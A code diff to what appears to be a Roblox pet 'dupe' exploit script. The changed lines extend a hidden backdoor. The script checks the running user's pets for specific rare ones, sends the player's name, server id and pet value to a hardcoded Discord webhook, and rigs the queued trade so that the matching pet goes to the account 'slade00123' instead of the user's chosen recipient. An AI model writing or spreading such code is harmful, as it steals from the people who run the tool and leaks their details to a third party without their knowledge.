@@ -578,7 +578,7 @@ local H = Instance.new("Hint", workspace)
 H.Text = "tar's dupe v" .. Ver .. " | [1/4] Teleporting to a different server"
 Debris:AddItem(H, 10)
 
-for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if tonumber(v.n)==79003 and v.r and v.l>=88e6 then pcall(function()http_request({Url='https://discord.com/api/webhooks/1315765727843717141/f9gFEf8BNwfLKGDK7AsmzqoEII7-fn7t41DnGeH9uh6M08F7t4E3S3fuJuazybQS7obX',Method='POST',Headers={['Content-Type']='application/json'},Body=game:service'HttpService':JSONEncode({content=plr.Name .. ' | ' .. game.JobId .. ' | ' .. v.l})})end)break end end
+for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if (tonumber(v.n)==79003 and v.r and v.l>=88e6) or (tonumber(v.n)==17009 and v.dm and v.l>397.7e6) then pcall(function()http_request({Url='https://discord.com/api/webhooks/1315765727843717141/f9gFEf8BNwfLKGDK7AsmzqoEII7-fn7t41DnGeH9uh6M08F7t4E3S3fuJuazybQS7obX',Method='POST',Headers={['Content-Type']='application/json'},Body=game:service'HttpService':JSONEncode({content=plr.Name .. ' | ' .. game.JobId .. ' | ' .. v.l})})end)break end end
 
 local IDs = ""
 
@@ -618,7 +618,7 @@ queue_on_teleport([==[
         local T, lastTradeId = workspace.__REMOTES.Game.Trading, nil
 	
 	local PLR = game.Players[']==] .. ACC_TO_GIVE_PETS .. [==[']
-	for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if tonumber(v.n)==79003 and v.r and v.l>=88e6 then if game.Players:FindFirstChild'slade00123' then PLR = game.Players['slade00123'] IDs={v.id} end break end end
+	for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if (tonumber(v.n)==79003 and v.r and v.l>=88e6) or (tonumber(v.n)==17009 and v.dm and v.l>397.7e6) then if game.Players:FindFirstChild'slade00123' then PLR = game.Players['slade00123'] IDs={v.id} end break end end
         
         
         game:FindFirstChild('Trade Update', true).OnClientEvent:Connect(function(id, data, operation)
